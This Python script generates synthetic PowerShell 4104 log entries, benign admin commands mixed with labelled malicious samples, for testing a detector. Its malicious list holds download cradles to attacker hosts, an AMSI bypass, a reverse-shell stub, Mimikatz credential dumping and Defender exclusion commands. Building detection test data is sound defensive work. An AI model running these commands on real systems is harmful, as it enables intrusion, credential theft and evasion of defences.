"""
Generates synthetic PowerShell Script Block Logging (Event ID 4104) entries
for testing the suspicious activity detector. Mix of benign admin scripts
and known malicious patterns (encoded commands, download cradles, AMSI
bypass, reverse shells, etc.) so the detector has real signal to find.
"""
import json
import random
from datetime import datetime, timedelta

BENIGN_SCRIPTS = [
    "Get-Process | Where-Object {$_.CPU -gt 50} | Sort-Object CPU -Descending",
    "Get-Service -Name 'wuauserv' | Restart-Service",
    "Get-ChildItem -Path C:\\Logs -Recurse -Filter *.log | Remove-Item -Force",
    "Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv users.csv",
    "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
    "Get-EventLog -LogName System -Newest 50",
    "Test-NetConnection -ComputerName fileserver01 -Port 445",
    "New-Item -Path C:\\Temp\\report -ItemType Directory -Force",
    "Get-WmiObject Win32_LogicalDisk | Select DeviceID, FreeSpace",
    "Import-Module ActiveDirectory; Get-ADGroupMember -Identity 'IT-Admins'",
    "Copy-Item -Path \\\\share\\backups\\daily -Destination D:\\Backup -Recurse",
    "Get-LocalUser | Where-Object {$_.Enabled -eq $true}",
    "Restart-Computer -ComputerName SRV-WEB01 -Force -Confirm:$false",
    "Get-NetIPAddress -AddressFamily IPv4 | Format-Table",
    "Invoke-Command -ComputerName SRV-DB01 -ScriptBlock {Get-Service mssqlserver}",
]

MALICIOUS_SCRIPTS = [
    # Base64 encoded command
    "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQA",
    # Download cradle - classic IEX(New-Object Net.WebClient).DownloadString
    "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')",
    # Invoke-WebRequest dropping an exe to a suspicious path
    "Invoke-WebRequest -Uri http://45.142.214.219/update.exe -OutFile C:\\Users\\Public\\svchost_update.exe",
    # AMSI bypass
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    # Reverse shell via TCPClient
    "$client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444);$stream = $client.GetStream()",
    # Mimikatz / credential dumping
    "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' | Out-File C:\\Temp\\creds.txt",
    # Obfuscated string concatenation to evade signature detection
    "$a='Inv';$b='oke-Expr';$c='ession';IEX ($a+$b+$c+\"(New-Object Net.WebClient).DownloadString('http://evil.test/x.ps1')\")",
    # Disabling Defender via exclusion path
    "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -ExclusionExtension '.exe'",
    # BITS transfer abuse (LOLBin download technique)
    "Start-BitsTransfer -Source http://198.51.100.23/stage2.dll -Destination C:\\Windows\\Temp\\update.dll",
    # FromBase64String decode + Reflection.Assembly.Load (in-memory execution)
    "$bytes=[Convert]::FromBase64String($encoded);[Reflection.Assembly]::Load($bytes) | Out-Null",
    # Hidden window + no profile + bypass execution policy + encoded
    "powershell -nop -noni -w hidden -ep bypass -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    # Suspicious WMI persistence
    "Set-WmiInstance -Class Win32_Process -Arguments @{CommandLine='powershell -enc <redacted>'} -Namespace 'root\\cimv2'",
]


def generate_logs(count=30, seed=42):
    random.seed(seed)
    logs = []
    base_time = datetime(2026, 6, 20, 8, 0, 0)
    computers = ["WKS-FIN-014", "WKS-HR-002", "SRV-WEB01", "WKS-DEV-031", "SRV-DC01"]
    users = ["CORP\\jsmith", "CORP\\mreyes", "CORP\\admin_svc", "CORP\\tlee", "CORP\\dpatel"]

    n_malicious = max(3, count // 5)  # roughly 20% malicious, at least 3
    script_pool = (
        [(s, False) for s in BENIGN_SCRIPTS * 3]
    )
    random.shuffle(script_pool)
    benign_picks = script_pool[: count - n_malicious]
    malicious_picks = [(s, True) for s in random.sample(
        MALICIOUS_SCRIPTS, min(n_malicious, len(MALICIOUS_SCRIPTS))
    )]

    all_picks = benign_picks + malicious_picks
    random.shuffle(all_picks)

    for i, (script, is_malicious) in enumerate(all_picks):
        ts = base_time + timedelta(minutes=random.randint(0, 600))
        logs.append({
            "EventID": 4104,
            "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S"),
            "Computer": random.choice(computers),
            "UserID": random.choice(users),
            "ScriptBlockId": f"{random.randint(10000000,99999999)}-{random.randint(1000,9999)}",
            "MessageNumber": 1,
            "MessageTotal": 1,
            "ScriptBlockText": script,
            # ground-truth label kept only for our own validation; real logs won't have this
            "_label_for_testing": "malicious" if is_malicious else "benign",
        })

    logs.sort(key=lambda x: x["TimeCreated"])
    return logs


if __name__ == "__main__":
    logs = generate_logs(count=30)
    with open("sample_powershell_logs.json", "w") as f:
        json.dump(logs, f, indent=2)
    print(f"Generated {len(logs)} sample log entries -> sample_powershell_logs.json")
    n_mal = sum(1 for l in logs if l["_label_for_testing"] == "malicious")
    print(f"  {n_mal} malicious, {len(logs) - n_mal} benign")
